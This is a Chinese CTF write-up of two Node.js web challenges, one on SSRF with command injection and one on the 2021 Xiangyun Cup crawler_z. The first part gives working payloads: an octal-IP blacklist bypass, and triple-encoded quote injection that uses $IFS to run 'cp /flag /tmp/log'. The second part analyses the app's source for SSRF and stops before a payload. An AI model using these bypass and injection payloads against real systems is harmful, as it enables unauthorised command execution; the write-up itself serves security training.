<p><img src="/../image/590.png" class="lazyload" data-srcset="/../image/590.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="590"></p>
<p>‰πüÂ∞±ÊòØËØ¥ÂèØ‰ª•ÈÄöËøáÂú®<strong>POST</strong>ËØ∑Ê±Ç‰∏≠ÁöÑbodyÊûÑÈÄ†‰∏Ä‰∏™ssrfÊºèÊ¥û</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request(dest,(err,result,body)=&gt;&#123;</span><br><span class="line">			res.json(body);</span><br><span class="line">			console.log(body);</span><br><span class="line">			console.log(&quot;1&quot;);</span><br><span class="line">		&#125;)</span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÊù•Áúã‰º†ÂÖ•ÁöÑËØ∑Ê±ÇÔºåÂèëÁé∞Êàë‰ª¨Â∑≤Áªè‰ªé<strong>POST</strong>ËØ∑Ê±ÇË∑≥ËΩ¨Âà∞‰∫Ü<strong>GET</strong>ËØ∑Ê±Ç‰∏≠Ôºå</p>
<p><img src="/../image/591.png" class="lazyload" data-srcset="/../image/591.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="591"></p>
<p>ÂêåÊó∂Áî±‰∫éÊàë‰ª¨ÊûÑÈÄ†ÁöÑËØ∑Ê±ÇÁöÑ<strong>ip</strong>‰∏∫<strong>0177.0.0.1</strong>‰πüÂ∞±ÁªïËøá‰∫Ü<code>blacklist.indexOf(req.ip)!=-1</code>ÁöÑÊ£ÄÊµãÔºåÁÑ∂ÂêéÊàë‰ª¨ÁúãÂà∞‰∏ãÈù¢</p>
<p><code>var u=req.query.url.replace(/[\&quot;\&#39;]/ig,&#39;&#39;);</code>Â∞Ü‰∏§ÁßçÂºïÂè∑ÂÖ®ÈÉ®ËøáÊª§‰∫ÜÔºåÁÑ∂Âêé let log&#x3D;`echo  ‚Äò${url.parse(u).href}‚Äô&gt;&gt;&#x2F;tmp&#x2F;log`; ÔºåÊúÄÂêé<code>res.json(&#123;data:fs.readFileSync(&#39;/tmp/log&#39;).toString()&#125;);</code>Ôºå‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰ΩøÁî®execÊñπÊ≥ïÔºåÊääflagÂÜôËøõ&#x2F;tmp&#x2F;logÔºåÁÑ∂ÂêéËØªÂèñÂá∫flag</p>
<p>ÈÇ£‰πàÂ∞±ÊÉ≥Âà∞ËØ≠Âè•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;http://123&#x27;cp /flag /tmp/log&#x27;&gt;&gt;/tmp/log&#x27;</span><br></pre></td></tr></table></figure>

<p>ÂÖàÊù•Áúã‰∏Ä‰∏ã‰º†ÂÖ•ÁöÑ‰∏úË•ø</p>
<p><img src="/../image/592.png" class="lazyload" data-srcset="/../image/592.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="592"></p>
<p>Â∞ùËØïÂÜôÂÖ•ÂëΩ‰ª§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1&#x27;cp /flag /tmp/log</span><br></pre></td></tr></table></figure>

<p><img src="/../image/593.png" class="lazyload" data-srcset="/../image/593.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="593"></p>
<p>ÂæàÊòéÊòæ<code>&#39;</code>Ë¢´ËøáÊª§‰∫ÜÔºå‰ΩÜËøôÈáåÂèØ‰ª•Âà©Áî®Áî®ÁºñÁ†ÅÁªïËøá</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3007/debug?url=http://127.0.0.1%2527cp /flag /tmp/log</span><br></pre></td></tr></table></figure>

<p><img src="/../image/594.png" class="lazyload" data-srcset="/../image/594.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="594"></p>
<p>ËøôÊ†∑Êï¥ÈÅìÈ¢òÁöÑÂü∫Êú¨ÊÄùË∑ØÂ∞±Â∑≤ÁªèÂá∫Êù•‰∫ÜÔºåÁÑ∂ÂêéÊàë‰ª¨Êù•Áúã‰∏Ä‰∏ã‰∏Ä‰∫õÂ∞èÁöÑ‰∏úË•øÔºå‰∏∫‰∫ÜÈò≤Ê≠¢<code>&#39;&gt;&gt;/tmp/log</code> ÁöÑÂπ≤Êâ∞ÔºåÊàë‰ª¨Áõ¥Êé•Âú®Êé•Êú´Â∞æÊ∑ªÂä†**%23<strong>ËøõË°åÊ≥®ÈîÄÔºåÈÅøÂÖçÁ©∫Ê†ºËøáÂ§öÊ¨°ÁöÑÁºñÁ†ÅÔºåÁõ¥Êé•Âà©Áî®</strong>$IFS**ËøõË°å‰ª£Êõø</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request(dest,(err,result,body)=&gt;&#123;</span><br><span class="line">			res.json(body);</span><br></pre></td></tr></table></figure>

<p>ËøôÈáå‰ªç‰ºöÂØπ‰º†ËæìËøõË°å‰∏ÄÊ¨°Ëß£Á†ÅÔºå‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨Ë¶ÅËøõË°å‰∏âÊ¨°ÁºñÁ†ÅËøõË°åÁªïËøá</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0177.0.0.1:3000/debug?url=http://%252527;cp$IFS/flag$IFS/tmp/log;%2523</span><br></pre></td></tr></table></figure>

<p>ÂõûÂà∞È¢òÁõÆÁéØÂ¢ÉËøõË°åÊµãËØïÔºåÂèëÁé∞ÂâçÈù¢ÈÉΩÊòØÂØπÁöÑÔºåÂ∞±ÊòØ‰º†ÂÖ•Â§ÑÁöÑÈó≠ÂêàÂ≠òÂú®ÈóÆÈ¢òËøò</p>
<p><img src="/../image/595.png" class="lazyload" data-srcset="/../image/595.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="595"></p>
<p>‰ªñ‰ªçÁÑ∂Â∞ÜÊï¥‰∏™ËØ≠Âè•ÂΩì‰ΩúÂ≠óÁ¨¶ËøõË°å‰º†ÂÖ•ÔºåÁúã‰∫Ü‰∏Ä‰∏ãÂ§ß‰Ω¨ÁöÑÊñáÁ´†ÔºåÂèëÁé∞ËøôÈáåÂ≠òÂú®node.js ÁöÑ‰∫åÊ¨°Ëß£Á†ÅÔºåÂèØ‰ª•ÈÄöËøá**@**ËøõË°åÈôêÂà∂ÔºåËøôÊ†∑Êàë‰ª¨ÈáçÊñ∞ÊûÑÈÄ†payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0177.0.0.1:3000/debug?url=http://%252527@a;cp$IFS/flag$IFS/tmp/log;%2523</span><br></pre></td></tr></table></figure>



<h2 id="2021Á••‰∫ëÊùØ-cralwer-z"><a href="#2021Á••‰∫ëÊùØ-cralwer-z" class="headerlink" title="[2021Á••‰∫ëÊùØ]cralwer_z"></a>[2021Á••‰∫ëÊùØ]cralwer_z</h2><p>Âú®È¢òÁõÆ‰πãÂâçÂÖàËÆ∞‰∏Ä‰∏ã<strong>sequelize</strong>Êü•ËØ¢ÁöÑËØ≠Âè•ÔºåËøôÈÅìÈ¢òÈáåÈù¢Áî®Âà∞‰∫ÜÂæàÂ§ö</p>
<p><strong>findByPk</strong></p>
<p>ÈÄöËøá‰∏ªÈîÆÊù•Êü•ËØ¢‰∏ÄÊù°ËÆ∞ÂΩï</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await UserModel.findByPk(id).then(......</span><br></pre></td></tr></table></figure>

<p><strong>findOne</strong></p>
<p>Ê†πÊçÆidÊü•ËØ¢‰∏ÄÊù°ËÆ∞ÂΩï</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const favors = await UserModel.findOne()</span><br></pre></td></tr></table></figure>

<p><strong>findAll</strong></p>
<p>Êü•ËØ¢ÊâÄÊúâ‰ø°ÊÅØ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const users = await User.findAll();</span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÂÖàÁÆÄÂçï‰ªãÁªçÂá†ÁßçÂ∏∏ËßÅÁöÑÔºåÁÑ∂ÂêéÊàë‰ª¨Êù•ÁúãÊ∫êÁ†Å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const utils = require(&#x27;../utils&#x27;);</span><br><span class="line">const &#123; User &#125; = require(&#x27;../database&#x27;);</span><br><span class="line"></span><br><span class="line">const router = express.Router();</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, async (_, res) =&gt; res.render(&#x27;index&#x27;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/signin&#x27;, (_, res) =&gt; res.render(&#x27;signin&#x27;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/signin&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    let &#123; username, password &#125; = req.body;</span><br><span class="line">    if (typeof (username) !== &quot;string&quot; || typeof (password) !== &quot;string&quot;) &#123;</span><br><span class="line">        return res.render(&#x27;signin&#x27;, &#123; error: &quot;Parameters error.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    const user = await User.findOne(&#123; where: &#123; username: username &#125; &#125;);</span><br><span class="line">    if (!user || !utils.checkPassword(password, user.password)) &#123;</span><br><span class="line">        return res.render(&#x27;signin&#x27;, &#123; error: &quot;Invalid username or password.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    utils.signIn(req, user)</span><br><span class="line">    return res.redirect(&#x27;/user&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/logout&#x27;, (req, res) =&gt; utils.signOut(req, () =&gt; res.redirect(&#x27;/&#x27;)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/signup&#x27;, (_, res) =&gt; res.render(&#x27;signup&#x27;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/signup&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    let &#123; username, password, password_confirm &#125; = req.body;</span><br><span class="line">    if (typeof (username) !== &quot;string&quot; || typeof (password) !== &quot;string&quot; || typeof (password_confirm) !== &quot;string&quot;) &#123;</span><br><span class="line">        return res.render(&#x27;signup&#x27;, &#123; error: &quot;Parameters error.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (/^\s*$/.test(username) || /^\s*$/.test(password) || /^\s*$/.test(password_confirm)) &#123;</span><br><span class="line">        return res.render(&#x27;signup&#x27;, &#123; error: `Paramaters can&#x27;t be empty.` &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (password !== password_confirm) &#123;</span><br><span class="line">        return res.render(&#x27;signup&#x27;, &#123; error: `Password doesn&#x27;t match.` &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        const user = await User.findOne(&#123; where: &#123; username: username &#125; &#125;);</span><br><span class="line">        if (user !== null) &#123;</span><br><span class="line">            return res.render(&#x27;signup&#x27;, &#123; error: &quot;User already exists.&quot; &#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            await User.create(&#123; username: username, password: utils.hashPassword(password), bucket: `https://$&#123;crypto.randomBytes(16).toString(&#x27;hex&#x27;)&#125;.oss-cn-beijing.ichunqiu.com/` &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        return res.render(&#x27;signup&#x27;, &#123; error: &quot;Error creating user.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    return res.redirect(&#x27;/signin&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>

<p>ÁÆÄÂçïÂÆ°ËÆ°‰∫Ü‰∏Ä‰∏ã<strong>index.js</strong>ÔºåÂæàÂü∫Á°ÄÁöÑ‰∏Ä‰∏™ÁôªÂΩïÊ≥®ÂÜåÔºåÊ≤°‰ªÄ‰πà‰∏úË•øÔºåÂîØ‰∏Ä‰∏Ä‰∏™ÁúãËµ∑Êù•ÊÑüËßâÂèØËÉΩÊúâÁÇπ‰∏úË•øÁöÑ <code>bucket: https://$&#123;crypto.randomBytes(16).toString(&#39;hex&#39;)&#125;.oss-cn-beijing.ichunqiu.com/</code>ÔºåËøôÈáåÂÖàËÆ∞‰∏ã‰∏çÊèê</p>
<p>Áúã‰∏Ä‰∏ã<strong>user.js</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const createError = require(&#x27;http-errors&#x27;);</span><br><span class="line">const &#123; Op &#125; = require(&#x27;sequelize&#x27;);</span><br><span class="line">const &#123; User, Token &#125; = require(&#x27;../database&#x27;);</span><br><span class="line">const utils = require(&#x27;../utils&#x27;);</span><br><span class="line">const Crawler = require(&#x27;../crawler&#x27;);</span><br><span class="line"></span><br><span class="line">const router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    const user = await User.findByPk(req.session.userId)</span><br><span class="line">    return res.render(&#x27;index&#x27;, &#123; username: user.username &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/profile&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    const user = await User.findByPk(req.session.userId);</span><br><span class="line">    return res.render(&#x27;user&#x27;, &#123; user &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/profile&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class="line">    let &#123; affiliation, age, bucket &#125; = req.body;</span><br><span class="line">    const user = await User.findByPk(req.session.userId);</span><br><span class="line">    if (!affiliation || !age || !bucket || typeof (age) !== &quot;string&quot; || typeof (bucket) !== &quot;string&quot; || typeof (affiliation) != &quot;string&quot;) &#123;</span><br><span class="line">        return res.render(&#x27;user&#x27;, &#123; user, error: &quot;Parameters error or blank.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!utils.checkBucket(bucket)) &#123;</span><br><span class="line">        return res.render(&#x27;user&#x27;, &#123; user, error: &quot;Invalid bucket url.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    let authToken;</span><br><span class="line">    try &#123;</span><br><span class="line">        await User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            personalBucket: bucket</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123; userId: req.session.userId &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        const token = crypto.randomBytes(32).toString(&#x27;hex&#x27;);</span><br><span class="line">        authToken = token;</span><br><span class="line">        await Token.create(&#123; userId: req.session.userId, token, valid: true &#125;);</span><br><span class="line">        await Token.update(&#123;</span><br><span class="line">            valid: false,</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123;</span><br><span class="line">                userId: req.session.userId,</span><br><span class="line">                token: &#123; [Op.not]: authToken &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        next(createError(500));</span><br><span class="line">    &#125;</span><br><span class="line">    if (/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(bucket)) &#123;</span><br><span class="line">        res.redirect(`/user/verify?token=$&#123;authToken&#125;`)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Well, admin won&#x27;t do that actually XD. </span><br><span class="line">        return res.render(&#x27;user&#x27;, &#123; user: user, message: &quot;Admin will check if your bucket is qualified later.&quot; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/verify&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class="line">    let &#123; token &#125; = req.query;</span><br><span class="line">    if (!token || typeof (token) !== &quot;string&quot;) &#123;</span><br><span class="line">        return res.send(&quot;Parameters error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    let user = await User.findByPk(req.session.userId);</span><br><span class="line">    const result = await Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: true</span><br><span class="line">    &#125;);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            await Token.update(&#123;</span><br><span class="line">                valid: false</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; userId: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            await User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; userId: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = await User.findByPk(req.session.userId);</span><br><span class="line">            return res.render(&#x27;user&#x27;, &#123; user, message: &quot;Successfully update your bucket from personal bucket!&quot; &#125;);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            next(createError(500));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        user = await User.findByPk(req.session.userId);</span><br><span class="line">        return res.render(&#x27;user&#x27;, &#123; user, message: &quot;Failed to update, check your token carefully&quot; &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Not implemented yet</span><br><span class="line">router.get(&#x27;/bucket&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    const user = await User.findByPk(req.session.userId);</span><br><span class="line">    if (/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(user.bucket)) &#123;</span><br><span class="line">        return res.json(&#123; message: &quot;Sorry but our remote oss server is under maintenance&quot; &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Should be a private site for Admin</span><br><span class="line">        try &#123;</span><br><span class="line">            const page = new Crawler(&#123;</span><br><span class="line">                userAgent: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;,</span><br><span class="line">                referrer: &#x27;https://www.ichunqiu.com/&#x27;,</span><br><span class="line">                waitDuration: &#x27;3s&#x27;</span><br><span class="line">            &#125;);</span><br><span class="line">            await page.goto(user.bucket);</span><br><span class="line">            const html = page.htmlContent;</span><br><span class="line">            const headers = page.headers;</span><br><span class="line">            const cookies = page.cookies;</span><br><span class="line">            await page.close();</span><br><span class="line"></span><br><span class="line">            return res.json(&#123; html, headers, cookies&#125;);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.json(&#123; err: &#x27;Error visiting your bucket. &#x27; &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;profile</strong>Ë∑ØÁî±‰∏ã<strong>get</strong>‰º†ÂèÇÊ≤°‰∏úË•øÔºå<strong>POST</strong>‰º†ÂèÇÂ∞Ü<strong>bucket</strong>ËµãÂÄºÁªô<strong>personalBucket</strong>ÔºåÊõ¥Êñ∞Êï∞ÊçÆÂ∫ìÁîüÊàê<strong>token</strong>ÔºåÁÑ∂ÂêéÂØπ‰º†ÂÖ•ÁöÑ<strong>bucket</strong>ËøõË°åÊ≠£ÂàôË°®ËææÂºèÂà§Êñ≠ÔºåÊàêÂäüÂêéÊâßË°åÈáçÂÆöÂêëÂà∞**&#x2F;verify<strong>Ë∑ØÁî±‰∏ãÔºåÂπ∂ÊâìÂç∞</strong>token**</p>
<p>okÁÑ∂ÂêéÊù•Áúã**&#x2F;verify**Ë∑ØÁî±</p>
<p>ÂÖàÂØπ<strong>token</strong>ËøõË°åÊ£ÄÊµãÔºåÊ£ÄÊµãÈÄöËøáÂêéÊ†πÊçÆ<strong>req.session.userId</strong>Êü•ËØ¢Á¨¨‰∏ÄÊù°‰ø°ÊÅØÔºåÊü•ËØ¢Âà∞Ë∑üÊñ∞<code>valid: false</code>ÔºåÂêåÊó∂‰º†Ëæì<code>bucket: user.personalBucket</code></p>
<p>ÊúÄÂêéÁúãÂà∞Á¨¨‰∏â‰∏™Ë∑ØÁî±**&#x2F;bucket**</p>
<p>Ê†πÊçÆ<strong>req.session.userId</strong>Êü•ÊâæÂà∞‰ø°ÊÅØÔºåÂØπ<strong>user.bucket</strong>ËøõË°åÊ≠£ÂàôË°®ËææÊ£ÄÊµãÔºåÈÄöËøáÊ£ÄÊµãÂêéÂàõÂª∫‰∏Ä‰∏™Êñ∞ÂØπË±°<strong>Crawler</strong>ÔºåË∞ÉÁî®<strong>goto</strong>ÊñπÊ≥ïÔºåÊúÄÂêéÂèëÈÄÅ‰∏Ä‰∏™ËØ∑Ê±Ç</p>
<p>Êàë‰ª¨ÂÖàÂéªÁúã‰∏Ä‰∏ã<strong>goto</strong>ÊñπÊ≥ï</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">goto(url) &#123;</span><br><span class="line">        return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                this.crawler.visit(url, () =&gt; &#123;</span><br><span class="line">                    const resource = this.crawler.resources.length</span><br><span class="line">                        ? this.crawler.resources.filter(resource =&gt; resource.response).shift() : null;</span><br><span class="line">                    this.statusCode = resource.response.status</span><br><span class="line">                    this.headers = this.getHeaders();</span><br><span class="line">                    this.cookies = this.getCookies();</span><br><span class="line">                    this.htmlContent = this.getHtmlContent();</span><br><span class="line">                    resolve();</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                reject(err.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>goto</strong>ÊñπÊ≥ïÂÆûÁé∞<strong>this.crawler.visit</strong>ÔºåËøîÂõûÁ¨¨‰∏Ä‰∏™ÊúâÊïàÁöÑÂÖ∑Êúâ<strong>resource</strong>Â±ûÊÄßÁöÑÂØπË±°Ôºå‰πüÂ∞±ÊòØÊàë‰ª¨‰º†ÂÖ•ÁöÑ‰∏Ä‰∏™urlÂèÇÊï∞ÔºåËÄåËøô‰∏™urlÊ≠£Â•ΩÊòØÊàë‰ª¨‰∏ÄÁõ¥Âú®‰º†ÈÄíÁöÑ<strong>user.bucket</strong></p>
<p>ÊâÄ‰ª•Êàë‰ª¨Êù•Êçã‰∏Ä‰∏ãÊÄùË∑Ø</p>
<p>ËøôÈáåÊàë‰ª¨ÂâçÂêé‰∏§Ê¨°Áî®Âà∞Ê≠£ÂàôË°®ËææÔºåÁ¨¨‰∏ÄÊ¨°Êàë‰ª¨ÈúÄË¶ÅÊ≠£ÂàôË°®ËææÊàêÂäüÔºåÊâçËÉΩË∑≥ËΩ¨Âà∞**&#x2F;verify**Ë∑ØÁî±ÔºåËÄåÁ¨¨‰∫åÊ¨°Êàë‰ª¨ÂàôÈúÄË¶ÅÊ≠£ÂàôË°®ËææÂ§±Ë¥•ÔºåÂéªÂÆûÁé∞ÂèëÈÄÅËØ∑Ê±Ç</p>
